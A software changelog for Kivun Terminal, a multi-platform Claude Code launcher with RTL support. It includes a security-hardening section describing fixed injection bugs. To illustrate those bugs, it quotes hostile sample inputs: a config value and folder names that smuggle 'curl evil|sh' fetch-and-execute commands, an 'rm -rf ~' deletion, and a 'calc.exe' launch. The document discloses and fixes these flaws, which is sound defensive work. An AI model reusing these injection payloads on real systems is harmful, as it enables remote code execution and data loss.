# Changelog

All notable changes to Kivun Terminal are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [1.0.6] — 2026-04-19

### Security hardening pass — 2026-04-21

Full independent security review of the mac, linux, and Windows installer surfaces. 19 findings triaged across 3 critical, 7 high, 6 medium, 3 low. 17 fixed, 1 narrowed, 1 partial, 3 deferred (code-signing).

**Critical**

- **Config-driven RCE in Linux launcher (`payload/kivun-launch.sh`).** The tmp launch-script heredoc was unquoted, so `CLAUDE_FLAGS=$(curl evil|sh)` in `config.txt` would embed a literal `$(...)` into the generated script which bash then executed at launch. Fix: heredoc is now `<<'LAUNCHEOF'` (no interpolation), config values are written to a separate `launch-env.sh` via `printf %q` and sourced by the inner script. Live-tested with a malicious payload — the `$(...)` now passes through to claude as 4 literal argv tokens and never executes.
- **macOS Automator Quick Action shell injection (`mac/scripts/postinstall`).** The workflow built a shell command from the right-clicked folder name and passed it to AppleScript `do script`. A folder named `x'; curl evil|sh; #` would execute. Fix: consolidated the 80-line duplicated workflow body down to a 20-line dispatcher that forwards via `printf %q` + AS double-escape to the desktop `.command` shortcut, which has injection-safe arg handling.
- **macOS postinstall sudoers `NOPASSWD:ALL`.** The Homebrew bootstrap temporarily wrote a sudoers file granting the user passwordless sudo for *all* commands for a 30–60s window; if SIGKILL'd or power-cut during that window, the file would persist indefinitely. Narrowed to `NOPASSWD: /usr/bin/true` (enough for Homebrew's `sudo -v` pre-flight, nothing more) + proactive stale-file sweep on every install + `at`-scheduled 15-minute fallback removal. If Homebrew ever needs real sudo it now fails loud instead of silently receiving root.

**High**

- **Default credentials removed from `payload/config.txt`.** Shipped `USERNAME=username` / `PASSWORD=password` defaults were flagged by secret-scanners (gitleaks, truffleHog, GitHub push-protection) and were also a terrible pattern. WSL Ubuntu account is now created interactively on first boot; no credential keys in the file. Matching updates in `docs/SECURITY.txt` and `docs/CREDENTIALS.txt`.
- **`payload/kivun-terminal.bat` — unquoted SET inside FOR body.** `set RESPONSE_LANGUAGE=%%b` let CMD parse the config value — a line `RESPONSE_LANGUAGE=english& calc.exe` would execute `calc.exe` during config load. All 5 keys now use the quoted form `set "K=%%b"`.
- **`payload/kivun-terminal.bat` — folder-name injection in WSL invocation.** `bash -l -c "cd '%WSL_PATH%'..."` interpolated the folder path into single-quotes — a folder named `a';rm -rf ~;'` escaped and executed `rm`. Now passes via environment: `wsl ... env KIVUN_DIR="%WSL_PATH%" bash -c 'cd "$KIVUN_DIR"'`.
- **`payload/kivun.xlaunch` — X11 access control disabled.** `ExtraParams="-ac"` + `DisableAC="True"` let any local process (any Windows user, any LAN peer through the firewall) connect to VcXsrv display `:0` and keylog/screengrab. Fixed: `-ac` removed, `DisableAC="False"`, and the WSL-side launcher now authorizes only the invoking UID via `xhost +si:localuser:$USER` instead of the blanket `xhost +local:`.
- **NSI installer — VcXsrv TEMP-dropper pattern removed.** The installer was doing `curl -o $TEMP\vcxsrv_installer.exe` followed by silent-exec — the exact 4-factor cluster (download-to-temp + silent-install + elevation + unsigned parent) that trips Defender/SmartScreen cloud heuristics. Auto-install is gone entirely; the installer now opens the official VcXsrv page in the user's browser and prompts them to install manually. The VcXsrv section is now optional (`Section /o`) instead of pre-selected.
- **NSI installer — `curl \| bash` for Claude Code replaced with download-then-run.** Mid-download network drop previously left bash parsing a truncated script. Now: `curl -o $T && [ -s "$T" ] && bash "$T"` with `set -o pipefail` so a failed curl can be detected. Same fix applied in the Linux installer.
- **NSI installer — dropped `RequestExecutionLevel admin`.** Installer writes entirely to `$LOCALAPPDATA\Kivun-WSL` (per-user) and `HKCU` — running elevated meant those writes landed in the elevating admin's hive under over-the-shoulder UAC, making the install invisible to the invoking user. Now runs as `user`; the one admin-required step (`wsl --install` when WSL isn't already set up) becomes a documented prerequisite with clear instructions to run `wsl --install` from admin PowerShell first, then re-launch our installer normally.

**Medium**

- **`mac/scripts/postinstall` iTerm2 fallback** had the same folder-name shell-injection pattern as the Automator workflow. Fixed with a POSIX `shell_quote` helper + AppleScript double-escape for the `write text` literal.
- **Language prompt double-wrapping** in the Automator workflow case block — it stored `LANG_PROMPT="--append-system-prompt \"...\""` and then passed it as `claude --append-system-prompt '$LANG_PROMPT'`, producing `--append-system-prompt --append-system-prompt "..."`. Resolved via the consolidation above: the new shared `payload/languages.sh` returns just the phrase, and the `.command` shortcut wraps it in `--append-system-prompt` itself.
- **`payload/configure-statusline.js` path-with-quote injection.** Using `'node "' + path + '"'` would break on a path containing `"` and inject into Claude Code's `settings.json.statusLine.command`. Switched to `'node ' + JSON.stringify(path)` — JSON-safe and shell-safe.
- **Config parsers missing trailing-newline guard.** `while IFS='=' read -r key value; do …; done` dropped the last line if the config file didn't end in `\n`. Added `|| [[ -n "$key" ]]` to both the Linux launcher and the mac `.command` parsers.
- **Launcher tmpfile TOCTOU.** `/tmp/kivun-claude-launch-$UID.sh` was in a world-writable sticky-bit dir; a malicious local user could pre-symlink it to `~/.bashrc` and have `cat >` clobber it. Moved to `${XDG_CACHE_HOME:-$HOME/.cache}/kivun-terminal/claude-launch.sh` (user-owned, 0700).

**Architectural improvements done in the same pass**

- **`payload/languages.sh`** — single source of truth for the 23-language prompt map, sourced by both the Linux launcher and the macOS `.command` shortcut. Replaced ~70 lines of duplicated case statements that had already drifted (different hyphen/underscore conventions; extra undocumented keys in the Automator path). Also removes one vector for the Automator-vs-shortcut drift problem.
- **`mac/uninstall.sh`** (100 lines, new) — removes desktop `.command`, Finder Quick Action, shell-rc `CLAUDE_CODE_STATUSLINE` export, `statusLine` entry from `~/.claude/settings.json` (via Python JSON edit), `/usr/local/share/kivun-terminal/` tree, pkg receipt, and any stale sudoers file. Deployed into the `.pkg` at `/usr/local/share/kivun-terminal/uninstall.sh`; also available standalone in the repo. Matches the Linux uninstaller's scope and UX.
- **Statusline SHA256 integrity check.** Build-time step generates `statusline.mjs.sha256`; both installers verify before `cp`. Mismatch logs an error and skips install rather than shipping a corrupted file silently. Defends against pkg-extraction corruption.
- **kdialog on KDE instead of zenity.** Linux installer detects `$XDG_CURRENT_DESKTOP` and installs `kdialog` on KDE/Plasma (saves ~30 MB of GTK dependencies that get pulled in by zenity, which doesn't matter to anyone outside our target audience — RTL+Konsole users are overwhelmingly KDE). The launcher tries `kdialog` first when `XDG_CURRENT_DESKTOP=KDE`.

**Deferred (require a code-signing certificate purchase, not a code change)**

- Signed Authenticode `Kivun_Terminal_Setup.exe` — Azure Trusted Signing ~$10/mo or a standard Authenticode cert. Once available, `build-windows.yml` needs a `signtool sign` step between build and release-attach.
- Pre-release submission to Microsoft Defender analysis at `https://www.microsoft.com/en-us/wdsi/filesubmission` to shrink the SmartScreen warning window for early downloaders.
- Signed uninstaller (same cert).

These three together close all remaining "unsigned installer" findings; they are all downstream of buying a cert.

### Phase 3 — Linux port — 2026-04-20

New `linux/` directory with a shell-script installer that covers the four major Linux package ecosystems (apt, dnf, pacman, zypper) and integrates with both GNOME Files (Nautilus) and KDE Dolphin.

- **`linux/install.sh`** — detects distro via `/etc/os-release`, picks the right package manager, installs `konsole`, `nodejs`, `git`, `xdotool`, `wmctrl`, and a color-emoji font. Installs Claude Code via `curl https://claude.ai/install.sh | bash` (skipped if `claude` is already on PATH). Runs as the invoking user; sudo is only requested for the package-install step (with a background keep-alive so the user isn't prompted repeatedly during long installs).
- **`linux/kivun-launch.sh`** — simplified launcher (no WSLg / VcXsrv paths): loads `~/.config/kivun-terminal/config.txt`, refreshes the Konsole profile with the current BiDi/color settings, runs `setxkbmap` for Alt+Shift keyboard toggle (X11 only — warns on Wayland), resolves the target folder (CLI arg → zenity/kdialog picker → `$HOME`), builds a tmp inner-script, and `exec`s Konsole with `--profile KivunTerminal --workdir $TARGET -e $TMP`. Passes Claude `--settings ~/.local/share/kivun-terminal/settings.json` so the statusline always finds the Linux-path `node` binary.
- **`linux/uninstall.sh`** — removes the launcher, Konsole profile, desktop entries, Nautilus script, and Dolphin service menu. Keeps system packages and asks before removing the color scheme or `config.txt`.
- **`linux/kivun-terminal.desktop`** — app-menu entry with `@@HOME@@` placeholder substituted at install time. Declares `MimeType=inode/directory` so it's discoverable as an "Open with" handler for folders, plus `Actions=OpenHome;OpenPicker` for jumplist-style right-click menus.
- **`linux/nautilus-script`** — GNOME Files right-click integration. Reads `NAUTILUS_SCRIPT_SELECTED_FILE_PATHS` (primary) and `NAUTILUS_SCRIPT_CURRENT_URI` (fallback for folder-background context); if the user right-clicked a file rather than a folder, drops to its parent dir.
- **`linux/dolphin-servicemenu.desktop`** — KDE Dolphin service menu using `X-KDE-Priority=TopLevel` so "Open with Kivun Terminal" appears directly on the context menu instead of buried under Actions.
- **`.github/workflows/build-linux.yml`** — CI job on `ubuntu-latest`: syntax-checks all scripts with `bash -n`, pre-installs the packages `install.sh` would otherwise fetch, dry-runs the installer end-to-end, verifies the expected artifacts landed under `$HOME/.local/`, then packages `linux/` + `payload/` + `LICENSE` + `VERSION` into `kivun-terminal-linux-<VER>.tar.gz`. Uploads as an Actions artifact + attaches to GitHub Release on tag push.
- **`linux/README.md`** — quickstart, config schema, supported distros table, Wayland keyboard caveat, uninstall instructions.

Design notes:

- **No WSL / VcXsrv code paths** — on Linux we have a real X11 or Wayland session. `kivun-launch.sh` is ~200 lines instead of ~500 on WSL.
- **Config file at `~/.config/kivun-terminal/config.txt`** (XDG-standard) rather than `~/Library/Application Support/…` (macOS) or `%LOCALAPPDATA%\Kivun-WSL\…` (Windows). Schema unchanged: same `RESPONSE_LANGUAGE`, `TEXT_DIRECTION`, `TERMINAL_COLOR`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. New Linux-only `KEYBOARD_TOGGLE` (default `true`).
- **Konsole profile + ColorSchemeNoam** copied verbatim from the WSL build — same `BidiEnabled=true, BidiLineLTR=false` pair that gives Hebrew auto-detected right-alignment while English stays left-aligned.
- **Hebrew first-line limitation** — same upstream [#39881](https://github.com/anthropics/claude-code/issues/39881) issue documented in `README.md` with a link to 👍 it. Konsole handles the rest of the reply correctly.

### Phase 2 — macOS port — 2026-04-20

New `mac/` directory with a `pkgbuild`-based `.pkg` installer modeled on the reference project's postinstall (715 lines), rebranded to Kivun Terminal.

- **`mac/scripts/postinstall`** — installs Xcode CLT, Homebrew (with temp-sudoers fix for non-TTY `.pkg` context), Node, Git, Claude Code, statusline, config file, desktop `.command` shortcut with Finder folder picker + Terminal.app color theme, Finder Quick Action Automator workflow.
- **`mac/build.sh`** — local builder. Stages `statusline.mjs` + `configure-statusline.js` next to `postinstall` and runs `pkgbuild --nopayload --scripts mac/scripts`.
- **`.github/workflows/build-mac.yml`** — CI builder on `macos-latest`. Runs on tag push and manual dispatch, attaches the `.pkg` to GitHub Releases.
- **`mac/README.md`** — quickstart + config schema + build instructions.
- **Terminal choice** — new `MAC_TERMINAL=terminal|iterm2|wezterm` config key. Default `terminal`; when set to `iterm2` or `wezterm`, the desktop `.command` shortcut re-spawns into that emulator for better BiDi/RTL rendering.
- **Config schema** unified with the Windows build: same 23-language `RESPONSE_LANGUAGE`, `TERMINAL_COLOR`, `TEXT_DIRECTION`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. `USE_VCXSRV` (Windows-only) is commented out and explicitly noted.
- Hyphen naming (e.g. `azeri-south`) aligned with the Windows build. Underscore variants still accepted in the case statement for backward compat with users migrating from the reference.

Phase 2 is build-only for now — the user doesn't have a Mac to smoke-test on, so verification runs via the GitHub Actions `macos-latest` runner. Phase 3 (Linux `install.sh`) is next.

### Post-release patches — 2026-04-20

Second-day patches applied to the 1.0.6 payload (version string still unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Features ported from `kivun-terminal` (the sibling native Windows + macOS project)

- **Statusline** (`payload/statusline.mjs`, `payload/configure-statusline.js`) — 2-line ANSI-coloured status bar shown at the bottom of Claude Code's TUI. Line 1: folder, model (green for Opus, yellow for Sonnet/Haiku), context-usage bar, total tokens, session duration, cwd. Line 2: `Session -- undefined -- | Weekly -- undefined --` placeholders (Claude Code 2.1.71 doesn't expose rate-limit data to statusline stdin; byte-for-byte matching the reference project's output).
- **23-language prompt table** (`payload/kivun-terminal.bat` `:SET_LANG_PROMPT`) — expanded from the old 2-branch (English/Hebrew) to the full 23-language set: english, hebrew, arabic, persian, urdu, kurdish, pashto, sindhi, yiddish, syriac, dhivehi, nko, adlam, mandaic, samaritan, dari, uyghur, balochi, kashmiri, shahmukhi, azeri-south, jawi, turoyo.
- **Folder picker on launch** (`payload/folder-picker.wsf`) — optional via `FOLDER_PICKER=true` in `config.txt`. Native Windows folder-browse dialog pops before Konsole opens. Right-click "Open with Kivun Terminal" context-menu entries bypass it.
- **`fonts-noto-color-emoji`** added to installer step `[4/7]` so emojis (`👋`, `🔧`, `💻`, etc.) render as colour glyphs in Konsole instead of tofu boxes.
- **`VCXSRV X SERVER`** default flipped to `USE_VCXSRV=true` in `config.txt` — VcXsrv is the reliable path for Alt+Shift keyboard switching; launcher still falls back cleanly to WSLg if VcXsrv isn't installed or reachable.
- **Save-defaults on reinstall** — NSIS now wraps the `config.txt` `File` directive in `${IfNot} ${FileExists}` so existing user edits survive reinstall.

#### Statusline & settings plumbing (WSL-specific)

- **Statusline registration** (`payload/kivun-launch.sh`) — idempotent on every launch: copies `statusline.mjs` into `~/.local/share/kivun-terminal/`, fixes line endings, writes a dedicated `~/.local/share/kivun-terminal/settings.json` with just `{statusLine.type, statusLine.command}`, and also updates `~/.claude/settings.json` via `configure-statusline.js`.
- **`--settings` flag** — the tmp Claude-launch script invokes `claude --settings "$KT_SETTINGS" --append-system-prompt "..."`. Necessary because when cwd is under `/mnt/c/Users/<user>/`, Claude walks up the directory tree and picks up `%USERPROFILE%/.claude/settings.json`, which has a Windows-path `statusLine.command` (`node "C:/..."`) that Linux `node` cannot execute — silently breaking the user-home registration. The `--settings` override guarantees the Linux-path statusline wins.
- **Only-install-Node-if-missing** — NSIS step `[5/7]` now runs `command -v node >/dev/null` before `apt-get install nodejs npm`. When Claude's installer script has already placed a non-apt Node (common when Claude Code was installed prior to our installer), apt would otherwise fail with `exit 100 — held broken packages`.
- **`x11-xserver-utils` added to step `[4/7]`** so `xrandr` is available for primary-monitor detection (falls back to Xinerama head-at-0,0 when `xrandr` doesn't expose a `connected primary` tag).

#### Konsole positioning & window management

- **Primary-monitor-only window** (no longer spans both screens on dual-monitor setups). `payload/kivun-terminal.bat` queries Windows via `wmic DESKTOPMONITOR` (PowerShell is blocked by Group Policy on some machines — wmic works where PS doesn't). Passes `X Y W H` as a 7th argument to `kivun-launch.sh`.
- **80% of primary-monitor, centered** — users wanted a windowed-but-roomy default instead of maximized. Computed as `(TARGET_W*80/100, TARGET_H*80/100)`, positioned at the centre of the primary monitor.
- **Shortcut + WSL bash subprocess launch minimized** — `SW_SHOWMINIMIZED` on the desktop/Start Menu shortcut, `start "Kivun Bash" /MIN` on the WSL bash child. No visible CMD windows cluttering the desktop; all output still in `LAUNCH_LOG.txt` / `BASH_LAUNCH_LOG.txt`.
- **No `pause` on success paths** — the bat exits cleanly once Konsole is confirmed running (minimized window would otherwise need user to click it to dismiss).

#### Hebrew RTL — known upstream limitation documented

- **Upstream issue filed & consolidated** — [anthropics/claude-code#39881](https://github.com/anthropics/claude-code/issues/39881) tracks this. Detailed BiDi analysis + Option-A (RLM-prefix) fix proposal posted as a comment: [#39881 (comment)](https://github.com/anthropics/claude-code/issues/39881#issuecomment-4281323284). Full internal analysis kept at `docs/FEATURE_REQUEST_ANTHROPIC.md`; trimmed public version at `docs/FEATURE_REQUEST_ANTHROPIC_ISSUE.md`.
- **Prompt hack reverted** — earlier attempts to instruct Claude via `--append-system-prompt` to start replies with a dash / header / blank line all failed (Claude ignored formatting constraints on roughly half of replies). `RLM_SUFFIX` is now empty; the system prompt is minimal (`"Always respond in <Language>"` only), matching the reference project. Saves tokens and avoids brittle failing instructions.
- **TROUBLESHOOTING.md** — new section "Claude's Hebrew/Arabic response is left-aligned on the first line" explaining the upstream nature of the issue, what does and doesn't work, and a link to #39881 so users can 👍 it.

### Post-release patches — 2026-04-19 (same-day)

Patches applied to the 1.0.6 payload (version string unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Installer (`installer/Kivun_Terminal_Setup.nsi`)

- **WSL2 setup** — explicitly run `wsl --set-default-version 2` and `wsl --update` before installing Ubuntu; if Ubuntu exists on WSL1, convert it silently with `wsl --set-version Ubuntu 2`. Eliminates the `WSL1 is not supported with your current machine configuration` noise at the top of the install log.
- **Konsole install no longer hangs.** Root causes were (1) `sudo apt-get ...` waiting forever for a password with no TTY, and (2) NSIS `nsExec::ExecToLog` deadlocking on high-volume apt output (~300–500 MB of KDE dependencies). Now runs as `wsl -d Ubuntu -u root`, redirects output to `/tmp/kivun-apt.log`, and uses `nsExec::Exec` (no pipe capture). Install split into 6 numbered steps so Cancel is usable between them.
- **Every error path ends in an OK/Cancel MessageBox** — no more Task-Manager-to-kill-installer situations.
- **VcXsrv section default-checked** (`Section "VcXsrv..."` instead of `Section /o ...`) and **auto-skips** when VcXsrv is already installed. Check uses `$PROGRAMFILES64\VcXsrv\vcxsrv.exe` (NSIS is 32-bit, so plain `$PROGRAMFILES` is WOW64-redirected to `Program Files (x86)` — the wrong path) and falls back to `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VcXsrv is X server` in both 32- and 64-bit registry views.
- **Desktop shortcut now actually appears.** Two bugs: (a) `kivun_icon.ico` was referenced by the shortcut but never copied to `$INSTDIR` (added to `File` directives); (b) admin-elevated `$DESKTOP` / `$SMPROGRAMS` pointed at the elevated account's folders, not the invoking user's — added `SetShellVarContext current` in both install and uninstall sections.

#### Windows launcher (`payload/kivun-terminal.bat`)

- **Bat parsing fix.** Added `REM` and a nested `for ... call :STRIP_CR %%V` inside an `if exist config.txt (...)` block broke CMD's nested-parens parser and the script silently exited mid-run (no visible error, no CMD window, `LAUNCH_LOG.txt` just cut off). Reverted the config parser to the original simple form.
- **CR-tolerant language match.** Config lines come in as CRLF, so `%RESPONSE_LANGUAGE%` can end up as `english\r`. Comparison now uses `%RESPONSE_LANGUAGE:~0,6%` — first 6 chars, trailing CR harmless.
- **WSL path conversion for `$INSTDIR`.** `%~dp0` ends with `\`, which `wslpath` interprets as an escape. Now strips the trailing backslash before calling `wslpath -a`, and if that still fails, falls back to manual drive-letter conversion via the new `:WIN_TO_WSL_PATH` subroutine. Without this, the launch command was built with an empty `INST_WSL`, shifting every argument and passing an empty `CLAUDE_PROMPT` to `claude --append-system-prompt`.
- **Run as the WSLg-dir owner.** `wsl -d Ubuntu ...` now detects `stat -c %U /mnt/wslg/runtime-dir` and passes `--user <owner>`. See the TROUBLESHOOTING note on Qt runtime-dir checks for why this matters.
- **CRLF line endings enforced.** `kivun-terminal.bat` must be saved as CRLF. Files round-tripped through WSL/`cp` get LF-only endings, which CMD's parser silently mishandles in nested blocks.

#### WSL launcher (`payload/kivun-launch.sh`)

- **Hebrew RTL alignment.** Changed `BidiLineLTR` from `true` to `false` in the generated Konsole profile when `TEXT_DIR=rtl`. With `BidiLineLTR=true`, BiDi reordered the letters correctly but left the line base direction LTR (Hebrew showed left-aligned); with `false`, Konsole auto-detects line direction and Hebrew lines become RTL/right-aligned while English lines stay LTR.
- **`XDG_RUNTIME_DIR` no longer broken.** Previous logic replaced WSLg's `/mnt/wslg/runtime-dir` with a private `/tmp/runtime-<uid>` whenever `[ ! -O ]` returned true — which breaks Konsole's Wayland/D-Bus socket discovery because sockets live in the WSLg dir. Now tests `-d && -w && -S $WSLG_DIR/wayland-0` and keeps WSLg's dir when usable.
- **Qt permission check.** When we own `/mnt/wslg/runtime-dir` (i.e. we were launched as the right user), `chmod 700` on startup so Qt's `0700 only` check passes — without this, `QStandardPaths: wrong permissions ... 0777 instead of 0700` means no visible Konsole window.
- **Stale konsole cleanup.** `pkill -x -u $UID konsole` before launch — zombie Konsole processes from earlier failed runs were being picked up by `xdotool search --class konsole` as the "found Konsole window," making every retry appear to succeed while the new window never rendered.
- **Per-UID temp script path.** `/tmp/kivun-claude-launch-$(id -u).sh` instead of a fixed path. A stale file owned by a different UID (from an earlier run) would cause `Permission denied` on overwrite and make Konsole launch the old script's contents.
- **Better temp-script diagnostics.** Now prints the `claude` binary location, working dir, and exit code. If `claude` isn't in `PATH`, prints install instructions instead of silently closing.

#### Docs

- TROUBLESHOOTING.md — added sections for Qt runtime-dir checks, installer-appears-frozen, silent-bat-exit, and permission-denied on the temp script.


### Added — first standalone release

Kivun Terminal is carved out of the `chat/` folder in the ClaudeCode Launchpad CLI repo and published as its own product: a WSL2 + Ubuntu + Konsole launcher for Claude Code with real RTL/BiDi rendering that Windows Terminal cannot provide.

- **NSIS installer** (`Kivun_Terminal_Setup.exe`) — single-click installation of WSL2, Ubuntu, Konsole, wmctrl, xdotool, and the Claude Code CLI.
- **Dedicated install directory** `%LOCALAPPDATA%\Kivun-WSL` — separates logs, config, and launchers from Launchpad CLI v2.4.x (`%LOCALAPPDATA%\Kivun`), allowing both products to coexist on the same machine.
- **11 supported RTL languages** via `PRIMARY_LANGUAGE` in `config.txt`: hebrew, arabic, persian, urdu, pashto, kurdish, dari, uyghur, sindhi, azerbaijani (with Hebrew as default).
- **`KivunTerminal` Konsole profile** (renamed from `ClaudeHebrew` — the old name implied Hebrew-only). Deployed automatically on first launch.
- **`ColorSchemeNoam`** color scheme — light blue background (`#C8E6FF`) with dark foreground for readability.
- **VERSION file** drives the product version string in both the NSIS build and the batch launcher (single source of truth).
- **VcXsrv mode** (optional component) — enables real Alt+Shift keyboard layout switching inside Konsole. Falls back to WSLg when VcXsrv isn't available.
- **Right-click folder integration** (optional component) — "Open with Kivun Terminal" entry on Windows Explorer folder context menus.
- **Desktop + Start Menu shortcuts** — quick launch into `%USERPROFILE%`.
- **GitHub Actions release pipeline** (`build-windows.yml`) — tagging `v1.0.6` automatically builds `Kivun_Terminal_Setup.exe` and attaches it to the GitHub Release. RC and beta tags are marked pre-release.
- **Docs** — README, README_INSTALLATION, SECURITY, CREDENTIALS, TROUBLESHOOTING.

### Fixed — issues inherited from `chat/`

- `kivun-terminal.bat` referenced `%~dp0kivun.xlaunch`, which did not exist. `kivun.xlaunch` is now shipped in the payload.
- Launcher previously wrote logs to `%LOCALAPPDATA%\Kivun\` — the same directory Launchpad CLI uses. Changed to `%LOCALAPPDATA%\Kivun-WSL\` to prevent cross-contamination.
- Konsole profile name hardcoded as `ClaudeHebrew` despite 11 supported languages. Renamed to `KivunTerminal`.
- `config.txt` referenced three documentation files (`SECURITY.txt`, `CREDENTIALS.txt`, `README_INSTALLATION.md`) that never existed. All three are now written and shipped.

### Known limitations

- Installer is unsigned — Windows SmartScreen will show a warning on first run. Code signing requires a certificate (~$100/year) and is deferred.
- Konsole statusline (Sonnet/Opus badge, context %, session usage) — present in Launchpad CLI v2.4.x but not yet ported to this WSL variant. Planned for v1.1.
- macOS and native Linux builds are out of scope for v1.0.6. Planned for v1.1 (macOS via `pkgbuild` and GitHub Actions `macos-latest` runner).

[1.0.6]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.0.6
